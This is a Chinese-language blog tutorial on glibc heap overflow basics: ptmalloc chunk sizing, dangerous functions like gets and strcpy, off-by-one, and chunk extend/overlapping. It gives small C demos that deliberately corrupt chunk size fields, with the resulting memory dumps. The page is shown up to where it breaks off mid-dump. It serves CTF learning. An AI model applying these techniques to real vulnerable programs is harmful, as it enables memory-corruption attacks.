<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>堆溢出基础 - ggb0n&#039;s Blog</title><meta description="堆溢出简介堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。"><meta property="og:type" content="article"><meta property="og:title" content="堆溢出基础"><meta property="og:url" content="http://ggb0n.cool/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="堆溢出简介堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:published_time" content="2020-06-01T02:02:45.000Z"><meta property="article:modified_time" content="2020-06-04T16:11:40.035Z"><meta property="article:author" content="ggb0n"><meta property="article:tag" content="categories-java"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"},"headline":"堆溢出基础","image":["http://www.ggb0n.cool/images/back2.png"],"datePublished":"2020-06-01T02:02:45.000Z","dateModified":"2020-06-04T16:11:40.035Z","author":{"@type":"Person","name":"ggb0n"},"description":"堆溢出简介堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。"}</script><link rel="alternative" href="/atom.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/tools">CyberChef</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-06-01T02:02:45.000Z">2020-06-01</time><a class="commentCountImg" href="/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/#comment-container"><span class="display-none-class">42605bf39be72648aae2fd8be965f800</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="42605bf39be72648aae2fd8be965f800"> 99+</span>    </a><span class="level-item">an hour read (About 10781 words)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">堆溢出基础</h1><div class="content"><h2 id="堆溢出简介"><a href="#堆溢出简介" class="headerlink" title="堆溢出简介"></a>堆溢出简介</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。<a id="more"></a></p>
<p>不难发现，堆溢出漏洞发生的基本前提是：</p>
<ul>
<li>程序向堆上写入数据;</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制EIP，一般来说，我们利用堆溢出的策略如下：</p>
<blockquote>
<ul>
<li>1、覆盖与其<strong>物理相邻的下一个 chunk</strong> 的如下内容：<ul>
<li>prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小：<br>NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE、the True chunk size</li>
<li>chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li>2、利用堆中的机制（如<code>unlink</code>等 ）来实现任意地址写入（<code>Write-Anything-Anywhere</code>）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
</ul>
</blockquote>
<h3 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h3><p>堆溢出中比较重要的几个步骤如下：</p>
<h4 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h4><p>通常来说堆是通过调用glibc函数<code>malloc</code>进行分配的，在某些情况下会使用<code>calloc</code>分配。<code>calloc</code>与<code>malloc</code>的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>

<p>除此之外，还有一种分配是经由<code>realloc</code>进行的，<code>realloc</code>函数可以身兼<code>malloc</code>和<code>free</code>两个函数的功能。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk,*chunk1;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  chunk1=<span class="built_in">realloc</span>(chunk,<span class="number">32</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>realloc</code>的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作：</p>
<blockquote>
<p>1、当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时：</p>
<ul>
<li><p>如果申请 size &gt; 原来size：</p>
<ul>
<li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小；</li>
<li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)。</li>
</ul>
</li>
<li><p>如果申请 size &lt; 原来 size：</p>
<ul>
<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变；</li>
<li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分。</li>
</ul>
</li>
</ul>
<p>2、当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)；</p>
<p>3、当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作。</p>
</blockquote>
<h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。常见的危险函数如下：</p>
<ul>
<li>输入：<ul>
<li><code>gets</code>，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出：<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串处理函数：<ul>
<li><code>strcpy</code>，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li><code>strcat</code>，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上<code>ptmalloc</code>分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>堆内存结构如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//根据系统的位数，malloc会分配8或16字节的用户空间</span></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>注意：<code>chunk_hear.size = 用户区域大小 + 2 * 字长</code></p>
<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的<code>prev_size</code>字段储存内容。回头再来看下之前的示例代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的 chunk 大小是<code>24</code>个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span></span><br></pre></td></tr></table></figure>

<p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的<code>prev_size</code>域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>

<p>当<code>req=24</code>时，<code>request2size(24)=32</code>。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 prev_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p>
<h2 id="堆中的各类漏洞及利用"><a href="#堆中的各类漏洞及利用" class="headerlink" title="堆中的各类漏洞及利用"></a>堆中的各类漏洞及利用</h2><h3 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h3><p>严格来说<code>off-by-one</code>漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且<strong>只越界了一个字节</strong>。</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括：</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节；</li>
<li>字符串操作不合适（比如<code>strlen()</code>函数计算字符串长度时不考虑结束符<code>\x00</code>，而<code>strcpy()</code>函数在复制的时候会复制<code>\x00</code>，二者一起用就会导致off-by-one）。</li>
</ul>
<p>单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制<code>ptmalloc</code>验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。<br>此外，需要说明的一点是<code>off-by-one</code>是可以基于各种缓冲区的，比如<code>栈</code>、<code>bss 段</code>等等，但是堆上的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>1、溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法；</p>
<p>2、溢出字节为 NULL 字节：在 size 为256的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位（记录前一个 chunk 块是否被分配）被清，这样前块会被认为是 free 块。<br>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理;<br>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</p>
<p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check ：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      <span class="built_in">size</span> += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h3><p><code>chunk extend</code>是堆漏洞的一种常见利用手法，通过<code>extend</code>可以实现<code>chunk overlapping</code>的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制<code>chunk header</code>中的数据</li>
</ul>
<h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
<p>1、在 ptmalloc 中，获取 chunk 块大小的操作如下，一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure>

<p>2、在 ptmalloc 中，获取下一 chunk 块地址的操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即使用当前块指针加上当前块大小。</p>
<p>3、在 ptmalloc 中，获取前一个 chunk 信息的操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>

<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
<p>4、在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
<p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。与 chunk extend 类似的还有一种称为 chunk shrink 的操作。</p>
<p>下面介绍各类型的 extend，参考的环境是 64 位的，因此偏移是 8 字节。</p>
<h4 id="类型1-对-inuse-的-fastbin-进行-extend"><a href="#类型1-对-inuse-的-fastbin-进行-extend" class="headerlink" title="类型1-对 inuse 的 fastbin 进行 extend"></a>类型1-对 inuse 的 fastbin 进行 extend</h4><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。示例程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当两个 malloc 语句执行之后，堆的内存分布如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>之后，我们把 chunk1 的 size 域更改为<code>0x41</code>，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示两个chunk大小之和为 0x40。在题目中这一步可以由堆溢出得到。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== 篡改大小</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span></span><br></pre></td></tr></table></figure>

<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Fastbins[<span class="attribute">idx</span>=0, <span class="attribute">size</span>=0x10] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=1, <span class="attribute">size</span>=0x20] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=2, <span class="attribute">size</span>=0x30]  ←  Chunk(<span class="attribute">addr</span>=0x602010, <span class="attribute">size</span>=0x40, <span class="attribute">flags</span>=PREV_INUSE) </span><br><span class="line">Fastbins[<span class="attribute">idx</span>=3, <span class="attribute">size</span>=0x40] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=4, <span class="attribute">size</span>=0x50] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=5, <span class="attribute">size</span>=0x60] 0x00</span><br><span class="line">Fastbins[<span class="attribute">idx</span>=6, <span class="attribute">size</span>=0x70] 0x00</span><br></pre></td></tr></table></figure>

<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">rax &#x3D; 0x602010</span><br></pre></td></tr></table></figure>

<h4 id="类型2-对-inuse-的-smallbin-进行-extend"><a href="#类型2-对-inuse-的-smallbin-进行-extend" class="headerlink" title="类型2-对 inuse 的 smallbin 进行 extend"></a>类型2-对 inuse 的 smallbin 进行 extend</h4><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 <code>0x70</code>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;===chunk1 篡改size域</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span 